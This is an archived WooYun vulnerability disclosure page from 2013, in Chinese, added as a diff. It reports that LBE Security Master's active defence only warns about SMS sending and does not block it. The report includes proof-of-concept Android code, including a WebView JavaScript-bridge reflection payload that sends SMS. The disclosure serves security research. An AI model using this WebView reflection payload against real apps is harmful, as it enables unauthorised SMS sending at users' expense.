@@ -1,0 +1,251 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		LBE手机安全大师主动防御功能缺陷  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		LBE手机安全大师主动防御功能缺陷  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/瘦蛟舞">瘦蛟舞</a> 
+</li><li>提交时间：		2013-12-31 13:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-31：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-05：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-03-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">LBE手机安全大师主动防御功能缺陷，可能无法拦截软件行为例如发短信、打开wifi等。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">事件起源于这个漏洞，原来我一直用的软件居然是纸老虎，伤心。<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-045798">WooYun: 华为商城安卓客户端存储跨站&amp;强制发短信</a> <br />
+<br />
+然后猜测可能是自己手机是双卡未采用标准api来发送短信，等官方发布等版本吧<br />
+<br />
+</p><pre><code>LBE安全大师5.1.5446更新日志<br />
+更新日期: 2013年,12月 20号 <br />
+下载<br />
+ 【新增】首款支持隐私空间NFC解锁的安全软件<br />
+ 【新增】适配双卡机型：三星I959、I9502、N9002、I929、P709 华为A199、HTC802w</code></pre><p class='detail'><br />
+<br />
+嗯哼，新版发布了袄支持我的手机啦，再次试了下，居然还是只能提示不能拦截。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">写个小程序测试下吧。<br />
+<br />
+0x00<br />
+<br />
+api：15||17<br />
+<br />
+phone：i959  android4.2.2<br />
+<br />
+LBE:5.1.5446<br />
+<br />
+0x01<br />
+<br />
+分别使用：标准api、调用短信activity、非标准api、webview代码执行四个方式来发送短信。<br />
+<br />
+部分代码如下：<br />
+<br />
+</p><pre><code>public void smsSend(View arg0) {<br />
+		<br />
+	/*	PendingIntent pi = PendingIntent.getActivity(MainActivity.this, 0,new Intent(), 0);*/<br />
+		<br />
+		SmsManager sms = SmsManager.getDefault();	<br />
+		sms.sendTextMessage(&quot;10001&quot;, null, &quot;105&quot;, null, null);<br />
+		Toast.makeText(MainActivity.this, &quot;oK&quot;, Toast.LENGTH_LONG).show();<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>public void smsSend3(View arg3) throws Exception{<br />
+		sendMessage(&quot;10001&quot;,&quot;103&quot;);<br />
+		Toast.makeText(MainActivity.this, &quot;oK3&quot;, Toast.LENGTH_LONG).show();<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>public class MainActivity extends Activity {<br />
+	EditText url;<br />
+	WebView show;<br />
+	WebView myWebView;<br />
+	@SuppressLint(&quot;SetJavaScriptEnabled&quot;)<br />
+	@Override<br />
+	protected void onCreate(Bundle savedInstanceState) {<br />
+		super.onCreate(savedInstanceState);<br />
+		setContentView(R.layout.activity_main);<br />
+		url = (EditText) findViewById(R.id.url);<br />
+		myWebView = (WebView) findViewById(R.id.view);<br />
+		WebSettings webSettings = myWebView.getSettings();<br />
+		webSettings.setJavaScriptEnabled(true);<br />
+		myWebView.addJavascriptInterface(new MyObject(this), &quot;my&quot;);<br />
+		<br />
+	}<br />
+	public boolean onKeyDown(int keyCode, KeyEvent event){<br />
+		if(keyCode == KeyEvent.KEYCODE_BACK){<br />
+			String urlStr = url.getText().toString();<br />
+			myWebView.loadUrl(urlStr);<br />
+			return true;<br />
+		}<br />
+		return false;<br />
+		<br />
+	}</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>&lt;script&gt;<br />
+	var obj_smsManager = my.getClass().forName(&quot;android.telephony.SmsManager&quot;).getMethod(&quot;getDefault&quot;,null).invoke(null,null);<br />
+	obj_smsManager.sendTextMessage(&quot;10000&quot;,null,&quot;102&quot;,null,null);<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+0x02<br />
+<br />
+开始测试,直接用sendTextMessage发送短信<br />
+<br />
+</p><p class="detail"><a href="../images/30103006f9ac41e956af7d8959f86de4207ac1f3.png" target="_blank"><img src="../images/30103006f9ac41e956af7d8959f86de4207ac1f3.png" alt="Screenshot_2013-12-30-09-51-53[1].png" width="600"/></a></p><p class="detail"><br />
+<br />
+监控到了哦<br />
+<br />
+</p><p class="detail"><a href="../images/3010324168c3845d71da06cb040613cd0957fc31.png" target="_blank"><img src="../images/3010324168c3845d71da06cb040613cd0957fc31.png" alt="Screenshot_2013-12-27-11-52-48[1].png" width="600"/></a></p><p class="detail"><br />
+<br />
+可以为什么明明拒绝了最后短信还是发送出去了。这都拦不了，感觉没必要往下测了。<br />
+<br />
+</p><p class="detail"><a href="../images/30103352cef88f2907c6e7dc7c47f8b333b51a4a.png" target="_blank"><img src="../images/30103352cef88f2907c6e7dc7c47f8b333b51a4a.png" alt="Screenshot_2013-12-27-11-53-21[1].png" width="600"/></a></p><p class="detail"><br />
+<br />
+还是继续测webview漏洞来发送短信依旧和只能监控无法拦截。<br />
+<br />
+0x03<br />
+<br />
+对腾讯手机管家、安全管家、360做了对比测试。果然还是数字公司最给力，全部截下。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">null </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/瘦蛟舞" title="瘦蛟舞">瘦蛟舞</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047381" title="LBE手机安全大师主动防御功能缺陷">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-01-05 13:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47381";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
